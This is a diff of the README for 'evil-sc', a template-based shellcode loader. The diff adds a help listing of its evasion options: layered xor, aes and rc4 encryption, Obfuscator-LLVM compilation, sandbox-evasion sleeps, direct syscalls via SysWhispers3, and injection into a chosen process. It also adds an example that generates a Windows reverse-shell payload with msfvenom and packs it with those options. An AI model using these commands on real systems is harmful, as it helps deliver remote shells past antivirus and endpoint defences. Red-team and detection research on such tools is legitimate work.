@@ -23,7 +23,7 @@ cd evil-sc
 
 2. Run the script
 ```
-$ python evil-sc.py -h
+$ python evil-sc.py windows -h
 
     ███████╗██╗   ██╗██╗██╗      ███████╗ ██████╗
     ██╔════╝██║   ██║██║██║      ██╔════╝██╔════╝
@@ -33,25 +33,42 @@ $ python evil-sc.py -h
     ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
                                                  @v4resk
 
-usage: evil-sc.py [-h] --method METHOD [--process PROCESS_NAME] [--independent-encoder ENCODER] [--encoder ENCODER] [--sandbox-evasion SANDBOX_EVASION] shellcode
-
-Template-based shellcode loader
+usage: evil-sc.py windows [-h] -m {SimpleExec,CurrentThread,CreateThread} [-e {nop,rc4,uuid,base64,aes,des3,xor}] [-l] [-p PROCESS_NAME] [-se {sleep}]
+                          [-sc {SysWhispers3,GetSyscallStub}] [--sw-method {embedded,egg_hunter,jumper,jumper_randomized}] [-o OUTPUT_FILE] [--encoder ENCODER]
+                          shellcode
 
 positional arguments:
   shellcode             Specify the shellcode variable
 
 options:
   -h, --help            show this help message and exit
-  --method METHOD, -m METHOD
-                        Specify a method (CreateRemoteThread, ProcessHollowing)
-  --process PROCESS_NAME, -p PROCESS_NAME
-                        Specify the target process
-  --independent-encoder ENCODER, -ie ENCODER
-                        Specify a loader-independent encoder (sgn)
-  --encoder ENCODER, -e ENCODER
-                        Specify a loader-dependent encoder (test-enc, xor)
-  --sandbox-evasion SANDBOX_EVASION, -se SANDBOX_EVASION
-                        Specify sandbox evasion techniques (sleep)
+  -m {SimpleExec,CurrentThread,CreateThread}, --method {SimpleExec,CurrentThread,CreateThread}
+                        Shellcode-loading method
+  -e {nop,rc4,uuid,base64,aes,des3,xor}, --encrypt {nop,rc4,uuid,base64,aes,des3,xor}
+                        Template-dependent encryption or encoding method to be applied to the shellcode
+  -l, --llvmo           Use Obfuscator-LLVM to compile
+  -p PROCESS_NAME, --process PROCESS_NAME
+                        Process name for shellcode injection
+  -se {sleep}, --sandbox-evasion {sleep}
+                        Sandbox evasion technique
+  -sc {SysWhispers3,GetSyscallStub}, --syscall {SysWhispers3,GetSyscallStub}
+                        Syscall execution method for supported templates
+  --sw-method {embedded,egg_hunter,jumper,jumper_randomized}
+                        Syscall execution method for supported templates
+  -o OUTPUT_FILE, --outfile OUTPUT_FILE
+                        Output filename
+  --encoder ENCODER     Template-independent encoding method to be applied to the shellcode (default: sgn)
+
+```
+
+## Example
+
+```bash
+# Generate a shellcode
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /tmp/msfout.bin
+
+# Pack it
+python evil-sc.py windows -m SimpleExec -e xor -e aes -e nop -l -sc SysWhispers3 /tmp/msfout.bin
 ```
 
 ## Make a template
